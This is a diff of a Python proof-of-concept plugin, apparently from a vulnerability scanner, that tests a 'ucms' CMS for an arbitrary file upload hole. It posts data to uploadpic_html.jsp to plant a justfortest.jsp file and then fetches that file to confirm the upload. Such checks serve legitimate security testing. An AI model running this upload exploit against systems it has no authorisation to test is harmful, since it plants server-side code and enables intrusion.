@@ -2,20 +2,14 @@
 # -*- coding: utf-8 -*-
 __author__ = 'orleven'
 
-
-import urllib.parse
-import requests
-requests.packages.urllib3.disable_warnings()
-
-
-def get_script_info(data=None):
-    script_info = {
+def info(data=None):
+    info = {
         "name": "ucms upload",
         "info": "ucms upload.",
         "level": "high",
-        "type": "info"
+        "type": "upload"
     }
-    return script_info
+    return info
 
 def prove(data):
     xmldata = '''
@@ -27,18 +21,11 @@ def prove(data):
     data = init(data,'web')
     if data['base_url']:
         for url in [data['base_url'], data['url']]:
-            try:
-                myurl = url + '/ucms/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
-                res = requests.post(myurl, headers=data['headers'],data = xmldata,verify=False,timeout=data['timeout'])
-            except Exception as e:
-                res = None
+            myurl = url + '/ucms/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
+            res = curl('post',myurl,data = xmldata)
             if res != None and res.status_code is 200:
-                try:
-                    myurl = url + '/ucms/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
-                    testres = requests.post(myurl, headers=data['headers'], data=xmldata, verify=False,
-                                        timeout=data['timeout'])
-                except:
-                    testres = None
+                myurl = url + '/ucms/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
+                testres = curl('post',myurl,data = xmldata)
                 if testres != None and 'test by me' in testres.text:
                     data['flag'] = 1
                     data['data'].append({"page": myurl})
